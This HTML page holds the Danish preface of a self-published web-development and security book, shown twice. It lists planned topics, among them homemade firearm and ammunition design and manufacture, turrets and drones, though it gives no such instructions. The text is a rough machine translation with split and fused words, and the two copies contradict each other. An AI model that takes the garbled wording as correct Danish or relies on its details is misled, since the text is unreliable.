<!doctype html> <html lang="da">


  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Professionel underholdning, fotos, videoer, lyd, livestreaming og afslappet gameplay samt ID -scanning, webudvikling og surrogacy -tjenester.">
    <meta name="author" content="Charlotte Grace Harper">
    <link rel="icon" href="/media/favicon.ico">
    <title>Praktisk webbaseret dyb læring og sikkerhed ved et eksempel - Glam Girl X</title>
    <link rel="canonical" href="https://glamgirlx.com/da/practical-web-based-deep">
    <link href="/static/main.css" rel="stylesheet">
    <link rel="manifest" href="/site.webmanifest">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">
    <link rel="stylesheet" href="/static/fonts/bootstrap-icons.css">
    
<meta property="og:image" content="/media/static/default.png">
<meta name="pinterest:image" content="/media/static/default.png"/>

    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
         crossorigin="anonymous"></script>
	<script async src="https://www.googletagmanager.com/gtag/js?id=G-XG1SZ2K8S5"></script>
	<script>
	  window.dataLayer = window.dataLayer || [];
	  function gtag(){dataLayer.push(arguments);}
	  gtag('js', new Date());
	
	  gtag('config', 'G-XG1SZ2K8S5');
	</script>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16692395808">
    </script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'AW-16692395808');
    </script>
  </head>
  <body>
    <header>
      
      
      <nav id="glam-navbar" class="navbar fixed-top navbar-expand-lg navbar-light p-2" style="background-color: #e3f2fd;">
        <a style="position: relative; z-index: 1;" class="navbar-brand" href="/da/" title="Hjemmesiden">
	        <img src="/media/lips.png" alt="Logoet - Glam Girl X" width="30" height="30" style="border-radius: 50%; background-color: transparent;">
	    	Glam Girl X
    	</a>
        <button class="navbar-toggler ms-auto" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" data-bs-auto-close="true" data-bs-toggle="dropdown" aria-controls="navbarScroll" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        
        
        <div class="collapse navbar-collapse " id="navbarSupportedContent">
          <ul class="navbar-nav mr-auto">
            <li class="nav-item">
              <a class="nav-link" href="/da/news" title="Nye artikler">Nyheder</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/da/contact" title="Kontakt mig">Kontakte</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/da/landing" title="Besøg destinationssiden">Landing</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/da/chat" title="Videochat">Snak</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/da/private" title="Se private fotos med en nøgle">Privat</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="https://lotteh.com/payments/surrogacy/Daisy/?lang=da" title="Surrogacy plans">Surrogati</a>
            </li>
          </ul>
          <ul class="navbar-nav" style="margin-left: auto;">
            <form class="form-inline d-flex mt-2 mt-md-0" action="https://lotteh.com/search/" method="GET">
              <input class="form-control hide" type="text" id="lang" name="lang" value="da">
              <input class="form-control mr-sm-2" type="text" id="q" name="q" placeholder="Søge" aria-label="Søge" required>
              <button class="btn btn-outline-success my-2 my-sm-0" type="submit" title="Søg på min hjemmeside, lotteh.com">Søge</button>
            </form>
            <li class="nav-item">
              <a class="nav-link disabled" href="#" title="Altid gratis - Opret en konto til at støtte mig">Gratis</a>
            </li>
            <li class="nav-item align-middle">
              <small><i><a class="text-dark nav-link" style="vertical-align: middle;" id="current-time">

--- ---
</a></i></small>

            </li>
            <li class="nav-item align-middle">
              <small><i><a class="text-dark nav-link" style="vertical-align: middle;" id="current-time-text">


</a></i></small>

            </li>
            <li class="nav-item">
	          <a href="https://lotteh.com/landing/" title="Besøg destinationssiden">
                <div class="dynamicClockContainer" id="dynamicClockContainer" style="background-color: #ffcccb;">
        <div class="dhour" id="hour"></div> 
        <div class="dminute" id="minute"></div> 
        <div class="dsecond" id="second"></div> 
</div> 

              </a>
            </li>
          </ul>
        </div>
      </nav>
    </header>
    
    <main role="main" class="container">
        
	    <div style="height: 100px;"></div>
        
	    


<h1>Praktisk webbaseret dyb læring og sikkerhed ved et eksempel</h1>
<img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisy&#x27;s profilfoto" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
<p><i>Ved Daisy</i></p>

<div style="white-space: pre-wrap;">Praktisk webbaseret dyb læring og sikkerhed ved et eksempel
Tredje udgave
Charlotte Harper
3. juli 2024

Forord:

Sikkerhedsovervejelser i opbygning af software til Internettet er en vigtig del af enhver webudviklers plan og udførelse, mens man teknik en prototype, der er pålidelig, stabil og nyttig til praktiske formål. DOM (Document Object Markup) med sin implementering af HTML, JavaScript og CSS samt backend -software, der implementerer Python, C/C ++, Java og Bash, giver webudviklere frihed og magt til at skabe en lang række projekter, der udtrykker Kreativitet, giver brugervenlighed og funktionalitet, skildrer ydmyghed og karakter og giver brugervenlighed samt bekvemmelighed og vigtige tjenester, der alle er attraktive for den gennemsnitlige Joe, slutningen Bruger, der ønsker at dræbe tid eller få noget gjort på Internettet, normalt på en berøringsskærms -smartphone -enhed. De fleste mennesker ville ikke engang vide, hvor de skal starte, når de vil bygge et websted fra bunden,De ville have en tendens til at starte på en anden persons websted og opbygge noget begrænset i funktionalitet, pålidelighed, brugervenlighed og især kreativitet, når de kunne have haft alle de nyeste kraftfulde værktøjer til deres rådighed for at opbygge noget nyttigt uden at spilde tid på at trykke på knapper, og Især spilder penge på at betale for dyre abonnementer på software, som få mennesker ville bruge alligevel i betragtning af dets begrænsninger i brugervenlighed og fleksibilitet. Hvis du har et par minutter til at læse gennem denne bog og lære, hvad jeg vil lære dig, eller endda tale med mig personligt om dine mål og få nogle vejledninger i den rigtige retning og er motiverede til at lære at kode og skrive din egen software , tag denne bog hjem og læg dig til side til at lære at opbygge den næste indflydelsesrige, kraftfulde, strømlinede og vigtige webapplikation, et websted, der er alt sammen på dig og gør nøjagtigt, hvad du vil, og imødekommer dit publikums behov.

Om mig:
Jeg er softwareudvikler med en bredAnge of Experience in C/C ++, Java, Python, HTML, CSS og JavaScript. Jeg bygger websteder, som folk vil bruge, vil besøge og endda blive afhængige af at bruge bare for at lære, genskabe og dræbe tid, og vigtigst af alt, jeg sælger software. Hvis du havde en idé om nøjagtigt, hvordan du ville have et websted til at se og fungere, var du villig til at støtte mig, så jeg kan imødekomme mine egne behov, mens jeg opfylder din, og du er villig til at dække omkostningerne ved at køre et websted selv, Jeg ville bygge dig den næste YouTube, Tiktok, Twitter, Google eller endda en højteknologisk sikkerhedsapp, som kun kan få adgang til. I stedet for at prøve at sælge dig min tid, prøver jeg at købe din: Jeg vil tale dig til at bygge en app (websted) selv med de oplysninger, der allerede findes, og lære dig, hvad du har brug for for at være en uafhængig softwareudvikler, Iværksætter, der fører en succesrig karriere inden for det felt, du ønsker. Og lad mig være klar, den uddannelse, jeg giver dig, vil være uformel. Du kunne gå i skole og lære alt dette med enRMAL -uddannelse, eller endda læse denne bog i skolen, fuldfører dine opgaver og tag meget væk fra din uddannelse, men jeg vil ikke formelt sætte dig i det varme sæde og bede dig om at udføre opgaver. Jeg er ikke din professor, du kan tænke på mig som en ven, der vil guide dig mod en karriere drevet af din egen personlige succes. Og jeg sælger heller ikke dig succes, du bliver nødt til at købe den med din tid. At lære at kode har en stejl indlæringskurve og var aldrig let eller endda skulle være det. Du er nødt til at arbejde så hårdt som du muligvis kan og fortsætte med at prøve at mislykkes og prøve igen, selv når du er frustreret for at lære og opbygge apps selv. Det er i naturen af ​​selve koden. Kode køres af en compiler, der er designet til at give programmererfejlmeddelelserne, og disse vil lære dig, hvordan du koder, selvom du blot kopierer fejlen i din søgemaskine og læser andres eksempler. Og jeg må sige, du behøver ikke at være ekstremt rig, smart, succesrig,en detaljeret orienteret eller organiseret til at opbygge en app. Computeren tager sig af denne organisation for dig. Du skal bare holde ud gennem forsøget og fejlen, opretholde fokus og arbejde hårdt på det, du gør, og du vil have en meget succesrig karriere i hele det, du gør.

Hvem er jeg:
Jeg er klar over, at det sidste afsnit handlede mere om at lære og dine måder fra denne bog. Hvem er jeg nøjagtigt? Det er et kompliceret spørgsmål. Jeg er uklar på det selv, da jeg lider af medicinske tilstande, der kan gøre det vanskeligt for mig at endda kode eller skrive denne bog til tider, mens jeg præsenterer udfordringer med socialisering og identitetsproblemer, der gør mit liv vanskeligere, når det kommer til at introducere mig selv . Kort sagt, hvis du læser denne bog, bragte du den hjem, fordi du vippede gennem den og troede, at den var nyttig, eller endda hvis du lige læste så langt ind, for dig er jeg en ligesindet person, der vil se dig lykkes i Alt hvad du gør. Jeg er selv ingeniør, en softwareUdvikler og studerende, og jeg skriver denne bog til andre studerende, der ønsker at gøre deres liv lettere ved at have en håndbog om den software, de har brug for at gøre deres liv lettere ved , nyttige, store, funktionelle, sammenhængende og engagerende app, der kan skabe succes uanset forretningslinjen. Stort set er det, hvad jeg gør: Jeg bygger apps til at hjælpe mig selv og andre mennesker med succes. Jeg er også forfatter, selvom dette er min første publikation, som jeg agter at gennemføre for at sætte min portefølje sammen i et nyttigt dokument, og jeg er også en kunstner.
Jeg indrømmer dette for dig, jeg er slags en mærkelig person. Jeg er ikke perfekt, jeg har haft ins med loven, der endda førte mig til at forlade colleges og universiteter og forlade stater for at prøve at give et navn til mig selv med mere succes. Jeg er en kvinde ved fødslen, jeg bærer makeup, tager billeder af mig selv, bærer kjoler og andet kvinders tøj, og jeg forbliver bevidst om mig selv som enmand af natur. Jeg har haft problemer med andre mennesker i fortiden, der førte til kampe med at skrive og bygge webapps, og jeg undskylder, at jeg ikke har været i stand til at få denne bog i dine hænder før: Du havde brug for dette. Du vil gerne læse og skrive kode, der ligner min og fungerer som min og gør det samme, men endnu bedre, for hvis du har råd til at købe denne bog i stedet for at mash dit tastatur, som jeg gør bare for at oprette en bog selv, der spørger penge For det har du de ressourcer, du har brug for for at få succes i dit liv. Jeg havde alle slags problemer med familien, der voksede op, sundhedsmæssige forhold, læger, medierne og loven, og min kode afspejler dybt den kamp, ​​der er feminisme og kvindelig natur i en delt og frustreret verden. Imidlertid er denne bog noget, jeg dybt bryder mig om, min baby, min portefølje og mit levebrød, så jeg værdsætter din overvejelse, når du tager teksten hjem og omhyggeligt pore over den for at lære af mig. Husk, at jeg ikke er perfekt,Bogen har fejl, revisioner og nye udgaver, og du bliver nødt til at tænke med din logiske hjerne så godt du kan for at få en vellykket oplevelse med min skrivning. Forstå også, at jeg mener godt for dig, selv når du står over for udfordringer, når du skriver. Tænk over det som dette: Når du bare kan leje et computersystem for at gøre alt, hvad du muligvis kan forestille dig i det digitale rum, opbevare alle de oplysninger, du støder på, #$%! Yze og organiser det og kom til at forstå det, vil du Uundgåeligt støder på vanskeligheder med de oplysninger, du indtager og endda udgiver. Jeg fortæller dig dette, fordi jeg støder på de samme vanskeligheder. Brug denne bog på din egen risiko, arbejde med dit samfund og samfund til rådighed for dig for at opbygge software inden for en sikker indstilling, og tag ikke ting til personligt, når du fejler eller endda lykkes på den forkerte måde: det er sådan jeg kom så langt , og hvorfor jeg kan bringe dig denne tekst og hjælpe dig med at lykkes udenMig ødelagt, revet og flosset, mens jeg støder på de almindelige problemer, som alle gør på verdensplan takket være den paralellistiske globale skala på det netværk, som vi vil arbejde på, Internettet. Du er måske ikke meget fortrolig med, hvem jeg er med bare et par ord, men jeg opfordrer dig til at læse videre, du vil lære mig at kende, når du fortsætter med at læse og forstå mig, mens du bygger dine egne projekter for at afslutte dit arbejde. Der vil ikke være noget hjemmearbejde med denne bog, så længe dine professorer eller lærere ikke tildeler dig nogen, men jeg opfordrer dig meget til at opbygge en portefølje af projekter selv, mens du læser sammen, samt et Capstone -projekt, der viser, hvordan du kan Anvend det, du har lært. Mit Capstone -projekt er grundlaget for det meste af det, du vil læse i denne bog, da det indeholder kode fra mine tidligere projekter, kode, jeg har oprettet og lært at skrive metodisk i hånden, og en bred vifte af ideer og tip, der har hjulpet mig lykkes til det punkt, hvor jeg kan dreje op en simpel app, der erUlly fremhævede og ligner og opfører sig som en populær app, som du måske kan se din ven eller familie bruge på Internettet, annonceret til dig eller i nyhederne.

Hvad denne bog er:
Denne bog er en tutorial ved et eksempel. Du kan finde kode her, instruktioner til, hvordan man lærer at kode, information om fejlsøgning af kode og fastsættelse af fejl, fejlfindingstrin, instruktioner om, hvordan du sikkerhedskopierer og gemmer din kode, genindførelse, hvis nogen bryder din kode, sikr din kode, implementerer Din kode, opbyg interaktive websteder, der er underholdende, engagerende og vanedannende, og du får en fornemmelse af, hvem jeg er, hvorfor dette er vigtigt, og hvordan du fremstiller dig selv, din app og firmabillede samt softwaren Du bygger i det absolut bedste lys til at være det mest attraktive som muligt for dine slutb...</div>



<div id="reader-modal105" class="hide" style="position: fixed; left: 0; top: 0; width: 100%; height: 110%; z-index: 900; background-color: #fdfeff; overflow: scroll;">
<div style="position: relative;">
<div id="readertext105" style="width: 100%; height: 80%; overflow: scroll;" class="p-2">
<div style="height: 15%; width: 100%;"></div>
<legend class="article-content mt-5 pt-3">Praktisk webbaseret dyb læring og sikkerhed ved et eksempel</legend>
<p class="article-content mb-5 pb-5">
Praktisk webbaseret dyb læring og sikkerhed ved et eksempel
Tredje udgave
Charlotte Harper
3. juli 2024

Forord:

Sikkerhedsovervejelser i opbygning af software til Internettet er en vigtig del af enhver webudviklers plan og udførelse, mens man teknik en prototype, der er pålidelig, stabil og nyttig til praktiske formål. DOM (Document Object Markup) med sin implementering af HTML, JavaScript og CSS samt backend -software, der implementerer Python, C/C ++, Java og Bash, giver webudviklere frihed og magt til at skabe en lang række projekter, der udtrykker Kreativitet, giver brugervenlighed og funktionalitet, skildrer ydmyghed og karakter og giver brugervenlighed samt bekvemmelighed og vigtige tjenester, der alle er attraktive for den gennemsnitlige Joe, slutningen Bruger, der ønsker at dræbe tid eller få noget gjort på Internettet, normalt på en berøringsskærms -smartphone -enhed. De fleste mennesker ville ikke engang vide, hvor de skal starte, når de vil bygge et websted fraScratch, de ville have en tendens til at starte på en anden persons websted og opbygge noget begrænset i funktionalitet, pålidelighed, brugervenlighed og især kreativitet, når de kunne have haft alle de nyeste kraftfulde værktøjer til deres rådighed for at opbygge noget nyttigt uden at spilde tid på at trykke på knapper , og især at spilde penge på at betale for dyre abonnementer på software, som få mennesker ville bruge alligevel, da de er begrænsninger i brugervenlighed og fleksibilitet. Hvis du har et par minutter til at læse gennem denne bog og lære, hvad jeg vil lære dig, eller endda tale med mig personligt om dine mål og få nogle vejledninger i den rigtige retning og er motiverede til at lære at kode og skrive din egen software , tag denne bog hjem og læg dig til side til at lære at opbygge den næste indflydelsesrige, kraftfulde, strømlinede og vigtige webapplikation, et websted, der er alt sammen på dig og gør nøjagtigt, hvad du vil, og imødekommer dit publikums behov.

Om mig:
Jeg er softwareudvikler medOmråde af erfaring i C/C ++, Java, Python, HTML, CSS og JavaScript. Jeg bygger websteder, som folk vil bruge, vil besøge og endda blive afhængige af at bruge bare for at lære, genskabe og dræbe tid, og vigtigst af alt, jeg sælger software. Hvis du havde en idé om nøjagtigt, hvordan du ville have et websted til at se og fungere, var du villig til at støtte mig, så jeg kan imødekomme mine egne behov, mens jeg opfylder din, og du er villig til at dække omkostningerne ved at køre et websted selv, Jeg ville bygge dig den næste YouTube, Tiktok, Twitter, Google eller endda en højteknologisk sikkerhedsapp, som kun kan få adgang til. I stedet for at prøve at sælge dig min tid, prøver jeg at købe din: Jeg vil tale dig til at bygge en app (websted) selv med de oplysninger, der allerede findes, og lære dig, hvad du har brug for for at være en uafhængig softwareudvikler, Iværksætter, der fører en succesrig karriere inden for det felt, du ønsker. Og lad mig være klar, den uddannelse, jeg giver dig, vil være uformel. Du kunne gå i skole og lære alt dette med enFormel uddannelse eller endda læse denne bog i skolen, afslutte dine opgaver og fjerne meget fra din uddannelse, men jeg vil ikke formelt sætte dig i det varme sæde og bede dig om at udføre opgaver. Jeg er ikke din professor, du kan tænke på mig som en ven, der vil guide dig mod en karriere drevet af din egen personlige succes. Og jeg sælger heller ikke dig succes, du bliver nødt til at købe den med din tid. At lære at kode har en stejl indlæringskurve og var aldrig let eller endda skulle være det. Du er nødt til at arbejde så hårdt som du muligvis kan og fortsætte med at prøve at mislykkes og prøve igen, selv når du er frustreret for at lære og opbygge apps selv. Det er i naturen af ​​selve koden. Kode køres af en compiler, der er designet til at give programmererfejlmeddelelserne, og disse vil lære dig, hvordan du koder, selvom du blot kopierer fejlen i din søgemaskine og læser andres eksempler. Og jeg må sige, du behøver ikke at være ekstremt rig, smart,Essul eller endda detaljeret orienteret eller organiseret til at opbygge en app. Computeren tager sig af denne organisation for dig. Du skal bare holde ud gennem forsøget og fejlen, opretholde fokus og arbejde hårdt på det, du gør, og du vil have en meget succesrig karriere i hele det, du gør.

Hvem er jeg:
Jeg er klar over, at det sidste afsnit handlede mere om at lære og dine måder fra denne bog. Hvem er jeg nøjagtigt? Det er et kompliceret spørgsmål. Jeg er uklar på det selv, da jeg lider af medicinske tilstande, der kan gøre det vanskeligt for mig at endda kode eller skrive denne bog til tider, mens jeg præsenterer udfordringer med socialisering og identitetsproblemer, der gør mit liv vanskeligere, når det kommer til at introducere mig selv . Kort sagt, hvis du læser denne bog, bragte du den hjem, fordi du vippede gennem den og troede, at den var nyttig, eller endda hvis du lige læste så langt ind, for dig er jeg en ligesindet person, der vil se dig lykkes i Alt hvad du gør. Jeg er selv ingeniørUdvikler og studerende, og jeg skriver denne bog til andre studerende, der ønsker at gøre deres liv lettere ved at have en håndbog om den software, de har brug for at gøre deres liv lettere ved , nyttige, store, funktionelle, sammenhængende og engagerende app, der kan skabe succes uanset forretningslinjen. Stort set er det, hvad jeg gør: Jeg bygger apps til at hjælpe mig selv og andre mennesker med succes. Jeg er også forfatter, selvom dette er min første publikation, som jeg agter at gennemføre for at sætte min portefølje sammen i et nyttigt dokument, og jeg er også en kunstner.
Jeg indrømmer dette for dig, jeg er slags en mærkelig person. Jeg er ikke perfekt, jeg har haft ins med loven, der endda førte mig til at forlade colleges og universiteter og forlade stater for at prøve at give et navn til mig selv med mere succes. Jeg er en kvinde ved fødslen, jeg bærer makeup, tager billeder af mig selv, bærer kjoler og andet kvinders tøj, og jeg forbliver bevidst om mig selv som enKvinde af natur. Jeg har haft problemer med andre mennesker i fortiden, der førte til kampe med at skrive og bygge webapps, og jeg undskylder, at jeg ikke har været i stand til at få denne bog i dine hænder før: Du havde brug for dette. Du vil gerne læse og skrive kode, der ligner min og fungerer som min og gør det samme, men endnu bedre, for hvis du har råd til at købe denne bog i stedet for at mash dit tastatur, som jeg gør bare for at oprette en bog selv, der spørger penge For det har du de ressourcer, du har brug for for at få succes i dit liv. Jeg havde alle slags problemer med familien, der voksede op, sundhedsmæssige forhold, læger, medierne og loven, og min kode afspejler dybt den kamp, ​​der er feminisme og kvindelig natur i en delt og frustreret verden. Imidlertid er denne bog noget, jeg dybt bryder mig om, min baby, min portefølje og mit levebrød, så jeg værdsætter din overvejelse, når du tager teksten hjem og omhyggeligt pore over den for at lære af mig. Husk, at jeg ikke erECT, denne bog vil have fejl, revisioner og nye udgaver, og du bliver nødt til at tænke med din logiske hjerne så godt du kan for at få en vellykket oplevelse med min skrivning. Forstå også, at jeg mener godt for dig, selv når du står over for udfordringer, når du skriver. Tænk over det som dette: Når du bare kan leje et computersystem for at gøre alt, hvad du muligvis kan forestille dig i det digitale rum, opbevare alle de oplysninger, du støder på, #$%! Yze og organiser det og kom til at forstå det, vil du Uundgåeligt støder på vanskeligheder med de oplysninger, du indtager og endda udgiver. Jeg fortæller dig dette, fordi jeg støder på de samme vanskeligheder. Brug denne bog på din egen risiko, arbejde med dit samfund og samfund til rådighed for dig for at opbygge software inden for en sikker indstilling, og tag ikke ting til personligt, når du fejler eller endda lykkes på den forkerte måde: det er sådan jeg kom så langt , og hvorfor jeg kan bringe dig denne tekst og hjælpe dig med at lykkes udenAves mig ødelagt, revet og flosset, mens jeg støder på de almindelige problemer, som alle gør på verdensplan takket være den paralellistiske globale skala på det netværk, som vi vil arbejde på, Internettet. Du er måske ikke meget fortrolig med, hvem jeg er med bare et par ord, men jeg opfordrer dig til at læse videre, du vil lære mig at kende, når du fortsætter med at læse og forstå mig, mens du bygger dine egne projekter for at afslutte dit arbejde. Der vil ikke være noget hjemmearbejde med denne bog, så længe dine professorer eller lærere ikke tildeler dig nogen, men jeg opfordrer dig meget til at opbygge en portefølje af projekter selv, mens du læser sammen, samt et Capstone -projekt, der viser, hvordan du kan Anvend det, du har lært. Mit Capstone -projekt er grundlaget for det meste af det, du vil læse i denne bog, da det indeholder kode fra mine tidligere projekter, kode, jeg har oprettet og lært at skrive metodisk i hånden, og en bred vifte af ideer og tip, der har hjulpet mig lykkes til det punkt, hvor jeg kan dreje op en simpel app, derFuldt med og ser ud og opfører sig som en populær app, som du måske kan se din ven eller familie bruge på Internettet, annonceret til dig eller i nyhederne.

Hvad denne bog er:
Denne bog er en tutorial ved et eksempel. Du kan finde kode her, instruktioner til, hvordan man lærer at kode, information om fejlsøgning af kode og fastsættelse af fejl, fejlfindingstrin, instruktioner om, hvordan du sikkerhedskopierer og gemmer din kode, genindførelse, hvis nogen bryder din kode, sikr din kode, implementerer Din kode, opbyg interaktive websteder, der er underholdende, engagerende og vanedannende, og du får en fornemmelse af, hvem jeg er, hvorfor dette er vigtigt, og hvordan du fremstiller dig selv, din app og firmabillede samt softwaren Du bygger i det absolut bedste lys til at være det mest attraktive som muligt for dine slutbrugere, dit websteds besøgende. I denne bog vil jeg demonstrere en række eksempler på softwaredesign med fokus på nettet som platform såvel som sikkerhed. Vi vil starte læringsoplevelsen ved at opbygge en grundlæggendeOject ved hjælp af UNIX -skallen med sikkerhedskopierings- og scriptingfunktioner. Derefter vil vi undersøge et grundlæggende blogwebsted, opgradere vores blog med foto- og videofunktioner samt bruge disse funktioner til at anvende sikkerhedsløsninger ved hjælp af gratis software og sikre vores server ved hjælp af et pluggable godkendelsesmodul (PAM). Vi vil derefter gennemgå filhåndtering og behandling, udforske videoredigering, stemmedonation, stregkodescanning og optisk karaktergenkendelse, blandt andre koncepter. Undervejs vil vi undersøge API'er, som vil hjælpe os med at gøre vores software mere nyttig og sikker med gratis og betalte muligheder. Undervejs vil vi udforske fysiske sikkerheds- og militante værktøjer såsom skydevåben og ammunitionsdesign og fremstilling inklusive tønde og repeaterdesign, tårn og drone -design og andre rektorer, vi vil integrere med vores software på det eksisterende netværk for at beskytte vores software og demonstrere selvforsvar og resillience. Vi tager pauser undervejs for at bygge spil, 2d og 3dEndering -motorer og arbejde med indlejret hardware i casestudieeksempler på grundlæggende dimensionel gengivelsessoftware og en elektronisk vibrerende massager støbt i henholdsvis silikonegummi. Undervejs vil vi også anvende maskinlæringsløsninger, der allerede er tilgængelige for bedre at sikre vores software. Vi vil også anvende lagerværktøjer til rådighed for Internettet for at strømline og sikre processen. Denne bog er en guide til din succes med at opbygge en webapplikation og integrere den med et professionelt netværk af computer og indlejrede mekaniske systemer, og generelt en guide til bygningssoftware og indlejret hardware uden baggrundsviden eller tidligere erfaring. 

Hvad denne bog ikke er:
Hvis du virkelig vil have et websted, kan du bare oprette en simpel butik og sælge det, du har brug for, sende en blog, sende fotos eller videoer eller på anden måde uden nogensinde at skrive en enkelt kodelinie. Denne bog er ikke det. Denne bog lærer dig, hvordan du bygger software, der er mere nyttig, fuldt udFremhævet, funktionel og sikker end enhver software, du allerede kan finde, fordi den implementerer den nyeste software, der stadig er prototyper, kan være dyrt at køre i en skala, som ældre virksomheder opererer på, og appellerer ikke til baglæns, indviklede virksomheder, der er oprettet til Tjen penge til folk, der ikke rigtig gør noget. Hvis du følger denne bog nøje, vil du skrive kode, forskningskode, opbygge dine egne apps, og du vil tjene penge på det, du gør. Jeg vil tjene penge på denne bog, selv i tidlige faser, fordi den indeholder information, som folk har brug for og vil læse, og køber allerede, når de køber eller bruger mine apps. Denne bog bygger ikke en app til dig, men den vil pege dig i den rigtige retning og armere dig med de værktøjer, du har brug for, og de færdigheder og tip, der vil lette din egen succes med at opbygge software til Internettet, med hver linje af Kode, du bliver nødt til at skrive som et eksempel, klar til at blive samlet i software, du og dine tilhængere, gæster, klientel,Riends, familie, besøgende, entreprenører og befolkningen på Internettet ønsker at bruge og støtte.

Hvad du lærer:
Denne bog vil lære dig, hvordan du bygger og sælger software, virkelig funktionel, nyttig software, medieoptagelse, sikkerhedsfunktioner som ansigtsgenkendelse, maskinlæselig zone stregkodescanning, web -API'er til at autentificere, optage og gengive video og fotos og udveksle beskeder som Bluetooth og nær felt (NFC) kommunikation. Denne bog vil lære dig, hvordan du bruger en netværkscomputer med fokus på Debian Linux, hvordan man bygger bash -kode til at gøre installation og sikkerhedskopiering af din software til en problemfri, automatiseret brise, hvordan man bygger python -kode som en backend til at tjene dynamiske meddelelser, stil Ting, der pænt bruger CSS -stilarter med bootstrap, aktiver bruger login og interaktivitet gennem netværksenheder, bygg interaktive medier og netværk med andre websteder for at tilbyde sikkerhedsfunktioner som tekst Meddelelser til verifikation eller andre formål, ID -scanning, image og videomoderation, dataRansaktioner for at holde din software sikker, betalingsbehandling, cryptocurrency -handel, asynkrone opgaver og mere. Du lærer, hvordan du bygger dine egne Bluetooth -enheder, med batterier, opladere, mikrokontrollere, kredsløb, motorer og sensorer ved hjælp af lodde, tråd og 3D -trykt samt støbt materialer. Jeg vil demonstrere 3D Design Principals anvendt til additivfremstilling og værktøj og dørfremstilling, så du er i stand til at fremstille dine egne indlejrede, hardwareenheder med integrerede batterier, opladere, elektroniske kredsløb og funktionelle output. og netværk dem med Bluetooth og Internettet. Specifikt vil vi undersøge to casestudier, en vibrerende massager og en hjemmelavet skydevåben, begge programmeret i OpenSCAD, som er tilgængelig som en grafisk grænseflade eller kommandolinjeværktøj og kan integreres i et web for hurtigere resultater.
Du lærer, hvordan man bygger og implementerer et websted fra bunden uden forudgående erfaring, gør det funktionelt, sikkert, smukt, nyttigt og mestMportant praktisk. Du lærer, hvordan du bruger maskinlæring og computervision til at gøre et websted sikkert og mere praktisk, indspil video og lyd fra dit websted, donere din stemme, lave musik og modulere lyd for at skabe nyttige prøver, og hvordan man bryder igennem støjen med Udnyttelse af andre websteder til at opbygge det bedst mulige netværk af websteder, som du kan linke direkte til dit for at dele alle de nyttige oplysninger, du har at tilbyde, og endnu vigtigere bringer folk til din software og virksomhed. Denne bog vil være mest fokuseret på medier, sikkerhed og maskinlæring, som er de vigtigste tre komponenter, der hjælper dig med at opbygge nyttig software til internettet ved at engagere de rigtige brugere og frigøre de forkerte på en måde, der er realistiske, praktiske, Hands på og engagerende mens de også er automatisk og robust. 
Denne bog underviser i Unix, specifikt Debian (Ubuntu), Bash Shell, Python, HTML, CSS, JavaScript og en række nyttige softwarepakker tiln Ligesom anmodninger såvel som nyttig Bash -software som Git og FFMPEG. Jeg vil også lære dig, hvordan du handler med cryptocurrency automatisk og tager betalinger i cryptocurrency eller fra almindelige betalingskort, mens du endda udbetaler dine besøgende en andel af din indtægt, hvis du vælger at gøre det. Jeg vil lære dig, hvordan du også tjener penge på dit websted gennem reklame søgninger som muligt. Jeg vil lære dig, hvordan du sælger din software, annoncerer den, appellerer til klienter, der leder efter dine tjenester, og giver et navn til dig selv på internettet gennem veje, der allerede findes, er billige og fungerer godt. Jeg vil lære dig, hvordan du gemmer dine data på cloudcomputere, der fungerer for dig og gemmer dine data billigt, hvordan du planlægger og bygger et websted, der gør, hvad dine brugere vil have, og hvad du vil, og hvordan du holder dine brugere engagerede iing dit websted et tryk væk på deres telefoner med meddelelser, e -mail, tekstbeskeder, telefonopkald og flere muligheder for at bringe dine brugere tilbage til dit websted til din rådighed bag klik på en knap, der er sikret til dig. Denne bog vil fokusere på det praktiske ved udgivelse og distribution af medier i store mængder, fra tekst til fotos til videoer til lyd, gøre et godt indtryk på slutbrugere (dit klientel) og sælge dig selv på enhver måde, du gør for at oprette Et websted, en app, der er repræsentativt for dig og kun dig, og gør dig, din software og din virksomhed ser godt ud på den bedst mulige måde. Du lærer også et par tip og tricks fra mig, fra kodningstips, praktisk forfængelighed som makeup og fotografering, modellering og skuespil og mere, hvilket vil være vigtigt for at fremstille dig selv og din virksomhed i det bedst mulige lys ved hjælp af alle tilgængelige værktøjer til dig, mens du distribuerer så meget indhold, som du har brug for på tværs af en sund balance mellem platforme for at bringe dine til at udføre uden mere indsats, arbejde eller penge end nødvendigt.
Denne bog kaldes "Praktisk webbaseret dyb læring og sikkerhed som eksempel" af en grund: den handler om at lære at kode, specifikt til internettet, specifikt med fokus på sikkerhed, fra et praktisk synspunkt, med eksempler på arbejdskode, der tjener De praktiske formål, der er beskrevet i teksten. Læringskomponenten i denne tekst omfatter også maskinlæring, den kode, jeg vil vise dig, hvordan du kører på nettet, der vil håndtere computervision, ansigtsgenkendelse, billede og videomoderation, billedforbedring, opløsningsforbedring, billedtekst og andre opgaver som Forudsigelsesmetrics hentet fra billeder, såsom arten af ​​billedet som et autentisk, computeroverført billede eller en optisk kopi (et foto af et billede eller trykt foto). Maskinindlæring er meget vigtig, når det kommer til websikkerhed og softwaresikkerhed, fordi det kan præformere opgaver, der ellers var umulige. Din computerLog dig ind med en adgangskode, men det kan være mere sikkert at bruge den, hvis den logger dig ind med dit ansigt. Du kan lave en servercomputer til denne pengeskab, en computer, der normalt vil bede dig om et brugernavn og adgangskode og logge dig ind, måske med et bekræftelsestoken for hvert nyt login eller en ny IP -adresse, men hvis du bygger storskala, er let at Brug, grundlæggende sikker og kraftfuld software, kan dette være 